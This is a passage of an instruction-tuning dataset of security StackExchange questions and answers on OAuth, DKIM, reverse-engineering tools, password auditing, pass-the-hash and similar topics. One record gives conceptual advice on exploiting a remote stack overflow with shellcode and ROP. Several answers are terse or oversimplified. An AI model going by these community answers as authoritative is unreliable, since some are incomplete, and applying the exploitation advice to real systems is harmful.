    "instruction": "What is the answer to this question - Is there any security issue while two different process using different hard link of same file?\nTo reduce disk space I have planned to use a hard link instead of full copy, Is there any security issue while two different processes using different hard links of the same executable file as base?\n\n",
    "context": "",
    "output": "It is not uncommon especially for software for embedded systems (BusyBox etc) to have a single binary which has everything in it and then to hard link this binary to different names in order to provide the expected command names. This approach by itself is not a problem: while the different invocations of the binary will share read-only (or execute-only) code and data segments they will all have their own read-write stack and heap, strictly separated from the rest as with different binaries.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is there any security issue while two different process using different hard link of same file?\nTo reduce disk space I have planned to use a hard link instead of full copy, Is there any security issue while two different processes using different hard links of the same executable file as base?",
      "answer": "It is not uncommon especially for software for embedded systems (BusyBox etc) to have a single binary which has everything in it and then to hard link this binary to different names in order to provide the expected command names. This approach by itself is not a problem: while the different invocations of the binary will share read-only (or execute-only) code and data segments they will all have their own read-write stack and heap, strictly separated from the rest as with different binaries."
    }
  },
  {
    "instruction": "What is the answer to this question - oAuth2 scopes and filter conditions in url\nI have an api like /v1/api/data and two clients, client_unrestricted and client_restricted.\nThe api itself is protected by Oauth. I want to ideally register the clients with the OauthServer so when client_unrestricted makes a requests it gets to see all the data . client_restricted makes a requests it gets to see only subset of the data\nShould i ask the OAuth admin to register the clients so the endpoints are like this\nclient                      endpoint\nclient_unrestricted         /v1/api/data/{data-ids}?restricted=false\nclient_restricted           /v1/api/data/{data-ids}?restricted=true\nOr can OAuth Scopes help me here where i register only one endpoint /v1/api/data but vary the scopes for both the clients ?\nclient                      endpoint                            Scope\nclient_unrestricted         /v1/api/data                        restricted=false\nclient_restricted           /v1/api/data                        restricted=true\n\n",
    "context": "",
    "output": "In Oauth2, you restrict the redirect_uri that can handle the login request the user is sent to after logging in at the authorization server (AS).\nSo you would register two clients with the OAuth2 admin, each with its own redirect_uri.  But this is a defense against someone stealing the authorization code as it is passed from the client to the API.\nRestricting the data each client is server, is handled by using scopes, as you suggest.  I is usually best to have distinct API resources that serve the different types (restricted/unrestricted) data, and only give the unrestricted client the scope necessary to consume the unrestricted API.\nSomething like this:\n\n/v1/api/basicdata - available with a \"basic_data\" scope which both clients get.\n/v1/api/restricteddata - available with a \"restricted\" scope.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "oAuth2 scopes and filter conditions in url\nI have an api like /v1/api/data and two clients, client_unrestricted and client_restricted.\nThe api itself is protected by Oauth. I want to ideally register the clients with the OauthServer so when client_unrestricted makes a requests it gets to see all the data . client_restricted makes a requests it gets to see only subset of the data\nShould i ask the OAuth admin to register the clients so the endpoints are like this\nclient                      endpoint\nclient_unrestricted         /v1/api/data/{data-ids}?restricted=false\nclient_restricted           /v1/api/data/{data-ids}?restricted=true\nOr can OAuth Scopes help me here where i register only one endpoint /v1/api/data but vary the scopes for both the clients ?\nclient                      endpoint                            Scope\nclient_unrestricted         /v1/api/data                        restricted=false\nclient_restricted           /v1/api/data                        restricted=true",
      "answer": "In Oauth2, you restrict the redirect_uri that can handle the login request the user is sent to after logging in at the authorization server (AS).\nSo you would register two clients with the OAuth2 admin, each with its own redirect_uri.  But this is a defense against someone stealing the authorization code as it is passed from the client to the API.\nRestricting the data each client is server, is handled by using scopes, as you suggest.  I is usually best to have distinct API resources that serve the different types (restricted/unrestricted) data, and only give the unrestricted client the scope necessary to consume the unrestricted API.\nSomething like this:\n\n/v1/api/basicdata - available with a \"basic_data\" scope which both clients get.\n/v1/api/restricteddata - available with a \"restricted\" scope."
    }
  },
  {
    "instruction": "Question: Firmware-Mod-Kit Increases Size\nI love using firmware-mod-kid to modify SoHo router firmware.  The problem I encounter is that it often bloats the size of the image.  It appears this happens during the mksquashfs step.\nIf I'm just unsquashing a filesystem and then resquashing it with the same compression, with no modifications, why is the resulting image larger than the original?",
    "context": "",
    "output": "Answer: There is possible padding, try adding the -nopad option, assuming that you are using the same compression method.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Firmware-Mod-Kit Increases Size\nI love using firmware-mod-kid to modify SoHo router firmware.  The problem I encounter is that it often bloats the size of the image.  It appears this happens during the mksquashfs step.\nIf I'm just unsquashing a filesystem and then resquashing it with the same compression, with no modifications, why is the resulting image larger than the original?",
      "answer": "There is possible padding, try adding the -nopad option, assuming that you are using the same compression method."
    }
  },
  {
    "instruction": "Should you only focus on Blue Team/Red Team?\nCurrently in the situation where I want to shoot for a security analyst/SOC job but while I'm studying for my Cysa+ I am also studying red-team tactics. Should I either pick one or the other? What if I want to do red-team eventually, would it benefit me if I had blue-team experience before switching?\nConfused about what study path I should focus on if I'm not totally sure what route I want to go. Defending seems important but attacking and malware reverse engineering seems cool.",
    "context": "",
    "output": "Red-team and Blue-team skills are complementary if not transferrable based on my experience. Examples of this are wide ranging from a blue-team centric cybersecurity analyst being able to use their knowledge of exploitation to effectively threat model new systems to red-teamers being able to understand things like devops and secure code review to create better tooling.\nYou can't defend against what you don't understand so I implore you to look at red-team tactics. Based on the CYSA syllabus by CompTIA I would focus more on analysis and incident response, and look into malware reverse engineering later after passing one thing at a time.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Should you only focus on Blue Team/Red Team?\nCurrently in the situation where I want to shoot for a security analyst/SOC job but while I'm studying for my Cysa+ I am also studying red-team tactics. Should I either pick one or the other? What if I want to do red-team eventually, would it benefit me if I had blue-team experience before switching?\nConfused about what study path I should focus on if I'm not totally sure what route I want to go. Defending seems important but attacking and malware reverse engineering seems cool.",
      "answer": "Red-team and Blue-team skills are complementary if not transferrable based on my experience. Examples of this are wide ranging from a blue-team centric cybersecurity analyst being able to use their knowledge of exploitation to effectively threat model new systems to red-teamers being able to understand things like devops and secure code review to create better tooling.\nYou can't defend against what you don't understand so I implore you to look at red-team tactics. Based on the CYSA syllabus by CompTIA I would focus more on analysis and incident response, and look into malware reverse engineering later after passing one thing at a time."
    }
  },
  {
    "instruction": "brute force remote nop sled memory address\nELF x64 binary on a remote server communicates via simple socket server in C.\nAfter overflowing the buffer (total buffer is 2000, password buffer is less), overwriting the RIP, filling with NOP sled (512 nops), inserting a reverse bind shellcode on the top of that, finding out a perfect address (without \\x00) in middle of nop sled which after sliding it will execute the shellcode.\n\nRemote server ASLR is off;\n\nBinary compiled without canary and can execute code from stack.\n\nNo info leak AFAIK\n\n\nI understand the many outcomes but if I decide to brute force the remote server to find the NOP-sled address.\nAny good practice for that ?",
    "context": "",
    "output": "Brute force is not the way you should look to in anything unless its your last resort. The address space of x64 is too large to get brute force to work. Look up on this technique called ROP(Return Oriented Programming). Currently you're bruteforcing the RIP, what if there's some code in the binary that will help you jump to your shellcode without bruteforcing and plus no PIE means that address is constant. When your control is getting transferred at ret, look at what other registers contain. You might find code such as call eax in the binary.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "brute force remote nop sled memory address\nELF x64 binary on a remote server communicates via simple socket server in C.\nAfter overflowing the buffer (total buffer is 2000, password buffer is less), overwriting the RIP, filling with NOP sled (512 nops), inserting a reverse bind shellcode on the top of that, finding out a perfect address (without \\x00) in middle of nop sled which after sliding it will execute the shellcode.\n\nRemote server ASLR is off;\n\nBinary compiled without canary and can execute code from stack.\n\nNo info leak AFAIK\n\n\nI understand the many outcomes but if I decide to brute force the remote server to find the NOP-sled address.\nAny good practice for that ?",
      "answer": "Brute force is not the way you should look to in anything unless its your last resort. The address space of x64 is too large to get brute force to work. Look up on this technique called ROP(Return Oriented Programming). Currently you're bruteforcing the RIP, what if there's some code in the binary that will help you jump to your shellcode without bruteforcing and plus no PIE means that address is constant. When your control is getting transferred at ret, look at what other registers contain. You might find code such as call eax in the binary."
    }
  },
  {
    "instruction": "Please answer this question: What was the issue the UAE had with RIM/Blackberry and what was the outcome? What countries have similar agreements?\nI'd like to understand what came out of UAE's desire to monitor RIM traffic, and what technical compromise was made.\nDo other countries have similar agreements with RIM?  What are the details?  Please post references, or any supplemental information to the best of your knowledge.",
    "context": "",
    "output": "As far as I interpret the news there was no technical solution made. RIM made a contract with the UAE as well as India that they hand over communication of specific customers. It is not public under what circumstances they'll do it. There is only speculation around. \n\nIndia has lawful access, BlackBerry assures India on access to services\nTurkey wants RIM data\n\nSo the three known countries are UAE, India and Turkey. Maybe others want it too. If you google around you'll find more details.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What was the issue the UAE had with RIM/Blackberry and what was the outcome? What countries have similar agreements?\nI'd like to understand what came out of UAE's desire to monitor RIM traffic, and what technical compromise was made.\nDo other countries have similar agreements with RIM?  What are the details?  Please post references, or any supplemental information to the best of your knowledge.",
      "answer": "As far as I interpret the news there was no technical solution made. RIM made a contract with the UAE as well as India that they hand over communication of specific customers. It is not public under what circumstances they'll do it. There is only speculation around. \n\nIndia has lawful access, BlackBerry assures India on access to services\nTurkey wants RIM data\n\nSo the three known countries are UAE, India and Turkey. Maybe others want it too. If you google around you'll find more details."
    }
  },
  {
    "instruction": "How to use IDA pro to find ALL strings in an exe file?\nI've been using IDA for some time and most of the time I can find the strings I am looking for in the String panel.\nIn one of the recent exe files I was working on, many string are missing, or not shown in IDA.\nSure, not all string are always visible in an exe files, some may reside outside but when I load the same exe file into this site for searching all strings it found all the missing string not visible in IDA.\nMy question is how to make IDA show ALL the strings?\nThanks",
    "context": "",
    "output": "The problem was that I did not induce teh resources when importing the .exe file.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to use IDA pro to find ALL strings in an exe file?\nI've been using IDA for some time and most of the time I can find the strings I am looking for in the String panel.\nIn one of the recent exe files I was working on, many string are missing, or not shown in IDA.\nSure, not all string are always visible in an exe files, some may reside outside but when I load the same exe file into this site for searching all strings it found all the missing string not visible in IDA.\nMy question is how to make IDA show ALL the strings?\nThanks",
      "answer": "The problem was that I did not induce teh resources when importing the .exe file."
    }
  },
  {
    "instruction": "Please answer this question: Mac app purchase validation\nHow do I sell a mac app off of my website without somebody being able to copy-and-paste the app to some friends after he buys it, etc..\nI understand that you can use receipt validation when selling through the Mac App Store to stop this kind of thing, but what about for selling on my website?",
    "context": "",
    "output": "The reason the Apple app store can do it is that the app approval and revocation is built in along with authentication, ie the device checks for the validity of an app for you. \nYou could write your app with some code specific to the buyer or the device, for example using a device specific identifier as a decryptor, but an attacker could reverse engineer that.\nThe general rule is that if the attacker has your code they can change it. If you want at least a small bit of protection you'll have to pay the price and use the app store.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Mac app purchase validation\nHow do I sell a mac app off of my website without somebody being able to copy-and-paste the app to some friends after he buys it, etc..\nI understand that you can use receipt validation when selling through the Mac App Store to stop this kind of thing, but what about for selling on my website?",
      "answer": "The reason the Apple app store can do it is that the app approval and revocation is built in along with authentication, ie the device checks for the validity of an app for you. \nYou could write your app with some code specific to the buyer or the device, for example using a device specific identifier as a decryptor, but an attacker could reverse engineer that.\nThe general rule is that if the attacker has your code they can change it. If you want at least a small bit of protection you'll have to pay the price and use the app store."
    }
  },
  {
    "instruction": "Is null-byte injection possible in Java filenames?\nFrom the Area51 proposal",
    "context": "",
    "output": "Accordingly to the following resources:\n\nNull byte attacks are alive and well\nNull Byte Injection \nJava Null Byte injections\n\nwe can conclude that Null Byte injections are possible in Java.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is null-byte injection possible in Java filenames?\nFrom the Area51 proposal",
      "answer": "Accordingly to the following resources:\n\nNull byte attacks are alive and well\nNull Byte Injection \nJava Null Byte injections\n\nwe can conclude that Null Byte injections are possible in Java."
    }
  },
  {
    "instruction": "Answer the question below.\nWhich Domain Validation category does DKIM fall under?\nI know that the categories of domain validation are:\n\nRegular SSL\nMulti Domain Validation\nWildcard Certificates\nPremium SSL\n\nBut I am not sure under which of the above does DKIM falls.",
    "context": "",
    "output": "DKIM does not use any certificates at all and is also unrelated to TLS. This means that  a question about the kind of validation related to the subject of a certificate does not relate to DKIM at all.\nFor DKIM the domain owner itself associates a public key only (not a certificate) with the domain by putting it into a DNS TXT record and then uses the associated private key to add a signature to mails sent through the domain owners mail server. By checking this signature against the public key the recipient can verify that the mail was actually sent through the domain owners server which makes forging the sender harder.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Which Domain Validation category does DKIM fall under?\nI know that the categories of domain validation are:\n\nRegular SSL\nMulti Domain Validation\nWildcard Certificates\nPremium SSL\n\nBut I am not sure under which of the above does DKIM falls.",
      "answer": "DKIM does not use any certificates at all and is also unrelated to TLS. This means that  a question about the kind of validation related to the subject of a certificate does not relate to DKIM at all.\nFor DKIM the domain owner itself associates a public key only (not a certificate) with the domain by putting it into a DNS TXT record and then uses the associated private key to add a signature to mails sent through the domain owners mail server. By checking this signature against the public key the recipient can verify that the mail was actually sent through the domain owners server which makes forging the sender harder."
    }
  },
  {
    "instruction": "Is there an easy way to record how long it takes John the Ripper to crack passwords?\nWe're doing a password audit by loading the password file into John and letting it run for a couple of days. \nOne of the first questions I got in the remediation class was \"How long did it take to crack my password?\" According to a password calculator the guy used, his password should have taken over a century to crack, but John guessed it relatively early. \nNow, my manager is asking me to record how long it takes for each password on the next audit round, but I'm letting it run when I'm not here to observe and record. \nAny suggestions on a way to record the time? I'm doing this on a Kali Linux cluster.",
    "context": "",
    "output": "John the ripper logs its activity to stdout.  If you note that it's cracked a password, you can terminate the session with a ctrl-C.\nThe log file .john/john.log will note the account(s) that have been cracked, with a timestamp.  Grep that for 'Cracked' to turn those up.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is there an easy way to record how long it takes John the Ripper to crack passwords?\nWe're doing a password audit by loading the password file into John and letting it run for a couple of days. \nOne of the first questions I got in the remediation class was \"How long did it take to crack my password?\" According to a password calculator the guy used, his password should have taken over a century to crack, but John guessed it relatively early. \nNow, my manager is asking me to record how long it takes for each password on the next audit round, but I'm letting it run when I'm not here to observe and record. \nAny suggestions on a way to record the time? I'm doing this on a Kali Linux cluster.",
      "answer": "John the ripper logs its activity to stdout.  If you note that it's cracked a password, you can terminate the session with a ctrl-C.\nThe log file .john/john.log will note the account(s) that have been cracked, with a timestamp.  Grep that for 'Cracked' to turn those up."
    }
  },
  {
    "instruction": "Answer this question:\n\nHow to get MAC address via IP\nI have an IP address of a computer which I am currently away from, and I need the MAC address. \nHow do I get the MAC address if I ony have the IP?",
    "context": "",
    "output": "A: If you are on the same network you can open up a Terminal:\nping your_ip_address\n\nhit Ctrl-C on the keyboard to stop pinging then do a:\narp -a\n\na list should appear, look for the ip you just pinged and next to it is the MAC address of the device.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to get MAC address via IP\nI have an IP address of a computer which I am currently away from, and I need the MAC address. \nHow do I get the MAC address if I ony have the IP?",
      "answer": "If you are on the same network you can open up a Terminal:\nping your_ip_address\n\nhit Ctrl-C on the keyboard to stop pinging then do a:\narp -a\n\na list should appear, look for the ip you just pinged and next to it is the MAC address of the device."
    }
  },
  {
    "instruction": "What is the answer to this question - Using a virtual machine for increased layer of privacy (w/ tor)?\nOne of my friends told me that running tor in a virtual machine Linux and then passing it through a proxy on the underlying Windows would provide in his words great security. Is this true?\n\n",
    "context": "",
    "output": "If you create a more anonymous environment for your VM, then yes.  You can keep its software and browser plugins, etc, ... to a minimum and hence provide a more \"vanilla\" machine.\nOn top of that, if you'd prevent it from accessing the host machine, and sign in with a generic login (i.e: user and root).  Even when someone would compromise the machine, they'd have less information about the user using it.\nIf they compromise the machine completely,it's unlikely that they were to access the hosts' saved passwords, etc.  But it all depends on how well you keep both (or more) environments separate.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Using a virtual machine for increased layer of privacy (w/ tor)?\nOne of my friends told me that running tor in a virtual machine Linux and then passing it through a proxy on the underlying Windows would provide in his words great security. Is this true?",
      "answer": "If you create a more anonymous environment for your VM, then yes.  You can keep its software and browser plugins, etc, ... to a minimum and hence provide a more \"vanilla\" machine.\nOn top of that, if you'd prevent it from accessing the host machine, and sign in with a generic login (i.e: user and root).  Even when someone would compromise the machine, they'd have less information about the user using it.\nIf they compromise the machine completely,it's unlikely that they were to access the hosts' saved passwords, etc.  But it all depends on how well you keep both (or more) environments separate."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Downloading a file from a server with a secret: in text or binary?\nSuppose, a user can click a button on a website and downloads a file with a secret. Via ajax. Is it more secure if a server  generates that file and sends it as \n1) zip, tar or the like -- a binary file. Content type: application/octet-stream or application/zip or something similar.\n2) or as a plain text file? Content type: text/plain.\nNote that in the 1) case, zip/tar whatever isn't protected by a password. \nHTTPS is used in both cases.",
    "context": "",
    "output": "answer: No,\nIf the type of file is specified then there is no added security at all. For example, unzipping a file is so trivial that it doesn't add any security.\nIf you ask whether it's more secure to share a secret via a file with an unknown type then this is just security by obscurity. Sure security by obscurity discourage some people but it's still not secure.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Downloading a file from a server with a secret: in text or binary?\nSuppose, a user can click a button on a website and downloads a file with a secret. Via ajax. Is it more secure if a server  generates that file and sends it as \n1) zip, tar or the like -- a binary file. Content type: application/octet-stream or application/zip or something similar.\n2) or as a plain text file? Content type: text/plain.\nNote that in the 1) case, zip/tar whatever isn't protected by a password. \nHTTPS is used in both cases.",
      "answer": "No,\nIf the type of file is specified then there is no added security at all. For example, unzipping a file is so trivial that it doesn't add any security.\nIf you ask whether it's more secure to share a secret via a file with an unknown type then this is just security by obscurity. Sure security by obscurity discourage some people but it's still not secure."
    }
  },
  {
    "instruction": "Question: What is the difference between full end-to-end encryption and end-to-end encryption?\nWhat is the difference between full end-to-end encryption and end-to-end encryption?\nAre there any differences between these two terms?",
    "context": "",
    "output": "Answer: There is no difference. End-to-end encryption simply means that both endpoints share a secret key which is used to encrypt all traffic between them. There is no difference between \"full\" end-to-end encryption and end-to-end encryption. It's like the (lack of) difference between forward secrecy and perfect forward secrecy. They're just different terms to explain the exact same concept.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What is the difference between full end-to-end encryption and end-to-end encryption?\nWhat is the difference between full end-to-end encryption and end-to-end encryption?\nAre there any differences between these two terms?",
      "answer": "There is no difference. End-to-end encryption simply means that both endpoints share a secret key which is used to encrypt all traffic between them. There is no difference between \"full\" end-to-end encryption and end-to-end encryption. It's like the (lack of) difference between forward secrecy and perfect forward secrecy. They're just different terms to explain the exact same concept."
    }
  },
  {
    "instruction": "Answer the question below.\nHow is using an endpoint for public keys secure?\nOpenID Connect has discovery endpoints containing a JKWS endpoint to get public keys to validate Identity and Access tokens.\nSo for example:\n\nI have a desktop application which gets an Identity token from the STS\nthe application gets the jwks_uri from the Discovery document\nthe application gets the public keys from this uri and validates the Identity token\n\nSo a man-in-the-middle attacker (like malware on a PC) can:\n\nintercept an Identity token from the STS, modify it and sign it with its own private key\nintercept the jwks_uri request and return its own public key(s)\n\nNow the attacker can send anything he likes without the application knowing it?",
    "context": "",
    "output": "You cannot defend against this. What you have described is a totally pwned computer. The only thing to do is wipe and reformat. In general, you cannot do anything sensitive on a compromised or potentially compromised computer. \nSo don't worry about this. Make your app secure from network attacks and let the user determine whether their computer is secure.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How is using an endpoint for public keys secure?\nOpenID Connect has discovery endpoints containing a JKWS endpoint to get public keys to validate Identity and Access tokens.\nSo for example:\n\nI have a desktop application which gets an Identity token from the STS\nthe application gets the jwks_uri from the Discovery document\nthe application gets the public keys from this uri and validates the Identity token\n\nSo a man-in-the-middle attacker (like malware on a PC) can:\n\nintercept an Identity token from the STS, modify it and sign it with its own private key\nintercept the jwks_uri request and return its own public key(s)\n\nNow the attacker can send anything he likes without the application knowing it?",
      "answer": "You cannot defend against this. What you have described is a totally pwned computer. The only thing to do is wipe and reformat. In general, you cannot do anything sensitive on a compromised or potentially compromised computer. \nSo don't worry about this. Make your app secure from network attacks and let the user determine whether their computer is secure."
    }
  },
  {
    "instruction": "Sending data form registration forms\nI understand that sending data from the user to the server, unencrypted, is a bad practice.  That is logical.\nSo how do I encrypt 'userside' and send the data to the server in encrypted form?\nCan anyone suggest a good practice example?\nWhat are the advantages and disadvantages of encrypting in Javascript?  (What if the user has disabled Javascript?)",
    "context": "",
    "output": "The standard solution is to use SSL (HTTPS).\nPlease spend some time with the search tool on this site.  You will find these questions have all been answered on other questions, so you can find lots of good information.  For instance, a search on \"Javascript encryption\" will find a lot of information about the pitfalls of encrypting on the client-side in Javascript.\nMake sure to learn about how to enable SSL sitewide; about HSTS; and about the secure flag on cookies.\nIn general, I recommend OWASP as an excellent resource with a lot of information about good practices for securing web services.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Sending data form registration forms\nI understand that sending data from the user to the server, unencrypted, is a bad practice.  That is logical.\nSo how do I encrypt 'userside' and send the data to the server in encrypted form?\nCan anyone suggest a good practice example?\nWhat are the advantages and disadvantages of encrypting in Javascript?  (What if the user has disabled Javascript?)",
      "answer": "The standard solution is to use SSL (HTTPS).\nPlease spend some time with the search tool on this site.  You will find these questions have all been answered on other questions, so you can find lots of good information.  For instance, a search on \"Javascript encryption\" will find a lot of information about the pitfalls of encrypting on the client-side in Javascript.\nMake sure to learn about how to enable SSL sitewide; about HSTS; and about the secure flag on cookies.\nIn general, I recommend OWASP as an excellent resource with a lot of information about good practices for securing web services."
    }
  },
  {
    "instruction": "Can you tell me the answer to: What might one want to accomplish by running ffmpeg -i video.mp4 -map 0 -map_metadata 0:s:0 -c copy video.mp4 in terms of forensics?\nIn the eighth episode of the second series of Mr. Robot, Trenton\ndoes this to the video that was recorded by a VHS camera before releasing it to the public via Vimeo.\nffmpeg -i fuxFBI.mp4 -map 0 -map_metadata 0:s:0 -c copy fuxFBI.mp4\nFrom what I gathered from man ffmpeg, the command copies the metadata from the first stream of the input file,\nmost likely a video stream, to the global metadata of the output file.\nOne noticeable effect of this command is that it stripped the output file of handler_name   : SoundHandler and the\nmajor_brand tag. From the operational / forensic point of view, what advantage does the execution of this command give to her and to her crew of hackers?",
    "context": "",
    "output": "answer: From the operational / forensic point of view, what advantage does the execution of this command give to her and to her crew of hackers?\n\nNothing. At least they ran an actual [UNIX] command vs. many movies which continue to show made up UI full of gibberish. Normal forensics tries not to modify the source data as possible (researches usually use byte-perfect imaging to work with data) as any modifications may lead to various clues getting lost.\nMy personal favorite is the Matrix Reloaded movie nmap/sshnuke were used - that was as close to reality as possible.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What might one want to accomplish by running ffmpeg -i video.mp4 -map 0 -map_metadata 0:s:0 -c copy video.mp4 in terms of forensics?\nIn the eighth episode of the second series of Mr. Robot, Trenton\ndoes this to the video that was recorded by a VHS camera before releasing it to the public via Vimeo.\nffmpeg -i fuxFBI.mp4 -map 0 -map_metadata 0:s:0 -c copy fuxFBI.mp4\nFrom what I gathered from man ffmpeg, the command copies the metadata from the first stream of the input file,\nmost likely a video stream, to the global metadata of the output file.\nOne noticeable effect of this command is that it stripped the output file of handler_name   : SoundHandler and the\nmajor_brand tag. From the operational / forensic point of view, what advantage does the execution of this command give to her and to her crew of hackers?",
      "answer": "From the operational / forensic point of view, what advantage does the execution of this command give to her and to her crew of hackers?\n\nNothing. At least they ran an actual [UNIX] command vs. many movies which continue to show made up UI full of gibberish. Normal forensics tries not to modify the source data as possible (researches usually use byte-perfect imaging to work with data) as any modifications may lead to various clues getting lost.\nMy personal favorite is the Matrix Reloaded movie nmap/sshnuke were used - that was as close to reality as possible."
    }
  },
  {
    "instruction": "Answer the following question:\n\nDetailed API call descriptions not available in x64dbg\nI am following a RE tutorial, and the guy is using Ollydbg while I use x64dbg... and I don't find all the descriptions in that Olly has, and it's quite annoying !\nThere is an example from the two programs running the same Reverseme :\n\n\nHow can I enable the same detailed descriptions in x64dbg? Is it even possible?",
    "context": "",
    "output": "Out of the box, x64dbg doesn't have a feature to show Win API call descriptions unlike OllyDbg. \nFor that, you need to use a plugin like xAnalyzer or the older APIInfo Plugin.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Detailed API call descriptions not available in x64dbg\nI am following a RE tutorial, and the guy is using Ollydbg while I use x64dbg... and I don't find all the descriptions in that Olly has, and it's quite annoying !\nThere is an example from the two programs running the same Reverseme :\n\n\nHow can I enable the same detailed descriptions in x64dbg? Is it even possible?",
      "answer": "Out of the box, x64dbg doesn't have a feature to show Win API call descriptions unlike OllyDbg. \nFor that, you need to use a plugin like xAnalyzer or the older APIInfo Plugin."
    }
  },
  {
    "instruction": "Is Opal-based full disk encryption fully working for Linux?\nI'd like to know   to manage the password purely via the BIOS and not need to run any utility e.g. sedutil.",
    "context": "",
    "output": "First, if your BIOS can handle an Opal SED, then, yes it will work for Linux. Check your BIOS to see if it supports Opal.\nSecond, SED's protect against someone stealing your computer when it is powered off. In a sleep state, the SED is still drawing power and therefore exposed. So if an attacker steals your computer and wakes it from the sleep state, they potentially have access to all your data.\nThird, tools like sedutil make SED's independent of the BIOS. They are no more intrusive than BIOS solutions in that they ask for a password at boot time and then get get out of the way. The only drawback is that they take more effort to install than a pure BIOS solution.\nAt this time, sedutil will work with any BIOS that does not cut power to the SED during a reboot.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is Opal-based full disk encryption fully working for Linux?\nI'd like to know   to manage the password purely via the BIOS and not need to run any utility e.g. sedutil.",
      "answer": "First, if your BIOS can handle an Opal SED, then, yes it will work for Linux. Check your BIOS to see if it supports Opal.\nSecond, SED's protect against someone stealing your computer when it is powered off. In a sleep state, the SED is still drawing power and therefore exposed. So if an attacker steals your computer and wakes it from the sleep state, they potentially have access to all your data.\nThird, tools like sedutil make SED's independent of the BIOS. They are no more intrusive than BIOS solutions in that they ask for a password at boot time and then get get out of the way. The only drawback is that they take more effort to install than a pure BIOS solution.\nAt this time, sedutil will work with any BIOS that does not cut power to the SED during a reboot."
    }
  },
  {
    "instruction": "Question: Ripping/pasting code into an executable using Olly\nI'm working with some x86 assembly code and I need to rip from one executable and paste that code into another.\nOriginally, I had an executable that was meant to accept two command line parameters and run a handwritten function on them. However, I ran into annoyances with using GetCommandLine et al. to return the parameters in my ASM. Namely, it returned Unicode and I needed the parameters in ANSI. Rather than dealing with setting up the library calls and converting that way, I compiled a small program that uses command line arguments with the intent of reusing code.\nSo now I have two executables:\n\none with the command line parameters parsed and in their proper places\ntwo with the actual assembled function code inside of it.\n\nThe first executable has the space for the function NOP'd out, but I need a good way to paste the logic in. I've looked at Asm2clipboard, Code Ripper and data ripper, but they only have the functionality to rip the assembly out, but not paste it back in.\nI'm aware I'll have to fix addresses and things like that, but I can't find a way in Olly or other tools to move the code between the executables. I can go into HexEdit or something like that I supposed, but I was hoping there's an easier way.",
    "context": "",
    "output": "Answer: For OllyDbg, it is \n\nSelect code from the CPU window \nRight-click and choose Binary\nChoose Binary Copy\nIn the target CPU window, do the same but select Binary Paste",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Ripping/pasting code into an executable using Olly\nI'm working with some x86 assembly code and I need to rip from one executable and paste that code into another.\nOriginally, I had an executable that was meant to accept two command line parameters and run a handwritten function on them. However, I ran into annoyances with using GetCommandLine et al. to return the parameters in my ASM. Namely, it returned Unicode and I needed the parameters in ANSI. Rather than dealing with setting up the library calls and converting that way, I compiled a small program that uses command line arguments with the intent of reusing code.\nSo now I have two executables:\n\none with the command line parameters parsed and in their proper places\ntwo with the actual assembled function code inside of it.\n\nThe first executable has the space for the function NOP'd out, but I need a good way to paste the logic in. I've looked at Asm2clipboard, Code Ripper and data ripper, but they only have the functionality to rip the assembly out, but not paste it back in.\nI'm aware I'll have to fix addresses and things like that, but I can't find a way in Olly or other tools to move the code between the executables. I can go into HexEdit or something like that I supposed, but I was hoping there's an easier way.",
      "answer": "For OllyDbg, it is \n\nSelect code from the CPU window \nRight-click and choose Binary\nChoose Binary Copy\nIn the target CPU window, do the same but select Binary Paste"
    }
  },
  {
    "instruction": "Question: Is there any way to log in with a hash?\nI've understood that the following steps are taken when I log in to a site:\n1. My password is hashed\n2. The hash is compared to what's stored in the database.\n3. If the hashes are equal, I can log in. \nI'm also quite certain that if attackers gain access to the password database, they can use brute force to find the clear-text passwords if the hashing algorithm is weak enough. \nMy question is, is there any way for an attacker to bypass step 1 above? I.e. if he/she has gained access to a list of hashed passwords, can the hacker present that hash to the server, thus circumventing the hashing step?",
    "context": "",
    "output": "Answer: This is generally called 'Pass-the-hash' attack.\nIf authenticating party performs hashing itself and sends hash over the wire then system is likely susceptible to this attack.\nMost web applications don't do this though. They instead send the password and server does hashing, so there's no way to send hash directly.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
